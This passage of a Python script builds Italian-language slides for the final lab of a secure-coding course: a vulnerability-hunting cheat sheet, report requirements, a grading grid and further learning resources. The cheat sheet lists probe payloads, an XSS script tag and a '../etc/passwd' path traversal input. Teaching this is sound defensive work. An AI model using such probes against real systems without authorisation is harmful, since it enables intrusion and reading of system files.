        "",
        "XSS?",
        "  Campi rivisualizzati (commenti, profilo)",
        "  Test: <script>alert(1)</script>",
    ], 5, total, emoji="🔍")

    slide_content(prs, LL, "Cheat-sheet di campo (2)", [
        "Crypto Failures?",
        "  Apri il DB con DB Browser",
        "  Password in chiaro? MD5? bcrypt?",
        "",
        "Path Traversal?",
        "  Endpoint con parametro filename",
        "  Test: ?file=../etc/passwd",
        "",
        "BONUS — Cookie / Header / CVE in dipendenze",
        "  DevTools → Application → Cookies",
        "  pip-audit -r requirements.txt",
    ], 6, total, emoji="📋")

    slide_content(prs, LL, "Output richiesto", [
        "Almeno 3 vulnerabilità identificate",
        "",
        "Per ognuna:",
        "  Descrizione (cos'è, dove si trova)",
        "  Proof of Concept funzionante",
        "  Fix proposto in codice",
        "  Severity (Low / Medium / High / Critical)",
        "  Categoria OWASP",
        "  Norma violata (se applicabile)",
        "",
        "Lunghezza: 1-2 pagine. Formato libero.",
    ], 7, total, emoji="📄")

    slide_table(prs, LL, "Griglia di valutazione (su 100)",
                 ["Voce", "Peso"],
                 [
                     ["Numero vulnerabilità (≥3 = sufficiente, 5+ = ottimo)", "25"],
                     ["Correttezza tecnica dei PoC", "30"],
                     ["Qualità dei fix proposti", "30"],
                     ["Severity giustificata coerentemente", "10"],
                     ["Mapping OWASP / norma violata", "5"],
                     ["Sufficienza: 60/100", ""],
                 ], 8, total)

    slide_content(prs, LL, "Cosa distingue un report ECCELLENTE", [
        "Ha trovato almeno una vulnerabilità 'bonus'",
        "  (cookie senza HttpOnly, CVE in deps, header mancanti)",
        "",
        "PoC riproducibili passo-passo",
        "Fix non solo 'patch puntuale' ma raccomandazioni architetturali",
        "Cita correttamente GDPR/NIS 2 dove applicabile",
        "Executive summary chiaro in 3 frasi",
    ], 9, total, emoji="⭐")

    slide_section(prs, LL, "02", "Cosa porti via dal corso",
                   "5 idee, che ti restano tra 5 anni", 10, total)

    slide_takeaway(prs, LL, [
        "La sicurezza si PROGETTA dall'inizio, non si aggiunge",
        "DEFENSE IN DEPTH sempre. Mai una sola difesa.",
        "MENTALITÀ AVVERSARIA. Cosa fa che non dovrebbe?",
        "I fondamentali OWASP — riconosci a vista, correggi a memoria",
        "DOCUMENTA, TESTA, AUTOMATIZZA",
    ], 11, total)

    slide_content(prs, LL, "Per crescere ancora (gratuito)", [
        "PortSwigger Web Security Academy",
        "  Il miglior corso gratuito al mondo, lab guidati",
        "",
        "TryHackMe — beginner friendly",
        "HackTheBox starting point — più hard, cresci tanto",
        "OWASP — cheat sheets, top 10, ASVS",
        "",
        "Certificazioni entry:",
        "  CompTIA Security+ · eJPT · PortSwigger BSCP",
    ], 12, total, emoji="🚀")

    slide_quote(prs, LL,
                 "In azienda probabilmente nessuno ti chiederà 'fai sicurezza'. Sarà compito tuo dirla.",
                 None, 13, total)

    slide_qa(prs, LL, 14, total)

    prs.save("L8_lab_finale.pptx")
    print("OK L8")


if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    print("Generating slides v2...")
    make_l1()
    make_l2()
    make_l3()
    make_l4()
    make_l5()
    make_l6()
    make_l7()
    make_l8()
    print("Done")
